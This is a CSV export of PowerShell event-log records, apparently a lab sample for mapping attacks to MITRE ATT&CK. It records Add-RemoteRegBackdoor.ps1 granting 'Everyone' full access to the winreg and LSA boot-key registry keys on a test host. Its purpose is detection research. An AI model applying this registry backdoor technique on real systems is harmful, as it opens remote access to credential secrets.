RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
11,54715,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1033\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
12,54716,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1035\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Backdooring completed for key\""\n"",""Binary"":""""}}"
13,54717,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1037\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Backdooring started for key\""\n"",""Binary"":""""}}"
14,54718,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1039\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
15,54719,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1041\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
16,54720,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1043\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
17,54721,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1045\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
18,54722,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1047\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
19,54723,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1049\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
20,54724,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1051\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Backdooring completed for key\""\n"",""Binary"":""""}}"
21,54725,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1053\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Backdooring started for key\""\n"",""Binary"":""""}}"
22,54726,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1055\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
23,54727,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1057\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
24,54728,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1059\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
25,54729,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1061\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
26,54730,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1063\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
27,54731,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1065\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
28,54732,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,0,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1067\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Backdooring completed for key\""\n"",""Binary"":""""}}"
